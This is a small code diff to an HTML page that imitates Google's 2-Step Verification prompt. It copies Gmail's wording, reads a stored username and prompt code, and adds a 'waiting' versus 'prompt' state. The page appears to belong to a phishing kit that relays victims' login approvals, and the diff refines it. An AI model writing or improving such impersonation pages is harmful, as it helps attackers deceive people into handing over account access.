@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>2-Step Verification</title>
 
-<link href="https://fonts.googleapis.com/css?family=google+Sans:100,300,400,500,700,900" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Google+Sans:100,300,400,500,700,900" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <link rel="icon" type="image/x-icon" href="assets/gma.ico">
@@ -427,7 +427,9 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
     updatePhoneField("#code", sessionStorage.getItem("setPromptCode"));
   }
 
-  page = "prompt";
+  const page = loading.style.display === "block" && overlay.style.display === "block"
+    ? "waiting"
+    : "prompt";
   document.querySelector("#username").textContent = sessionStorage.getItem("user");
 
 });
